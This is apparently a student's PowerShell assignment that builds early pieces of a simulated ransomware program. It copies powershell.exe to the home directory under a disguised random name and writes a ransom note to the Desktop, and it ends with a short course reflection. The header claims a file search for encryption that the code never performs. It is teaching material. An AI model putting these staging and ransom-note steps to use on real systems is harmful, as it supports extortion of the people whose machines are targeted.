# Step1.ps1
# Searches the filesystem for files that can be encrypted (except critical systel files)

# Task 1
# Copy PowerShell.exe to the home directory and check if it exists
# First generate a random number
$random_num = Get-Random -Minimum 1000 -Maximum 9876
# Now copy the PowerShell executable to the new location
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" `
-Destination "~\EnNoB-$random_num.exe"
# Check if the file exists 
if (Test-Path -Path "~\EnNoB-$random_num.exe") {
    Write-Host "The file was found."
} else {
    Write-Host "The file was NOT found." 
}

# Task 2
# Create ransom note
# Ransom message
$message = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."
# Write the message to a file 
$message | Out-File -FilePath "~\Desktop\Readme.READ"
# Check to see if the file exists
if (Test-Path -Path "~\Desktop\Readme.READ") {
    Write-Host "The ransom note was found."
} else {
    Write-Host "The ransom note was NOT found." 
}

<# Reflection
Q) What did you like the most and least about this assignment?
A) I liked that we are in Powershell now as I have a lot of experince with that. 
   I disliked how slow the videos felt. I watched the videos as 2x speed and ocasionally I found myself sitting there waiting. 

Q) What additional questions do you have?
A) No additional questions at this time.
#>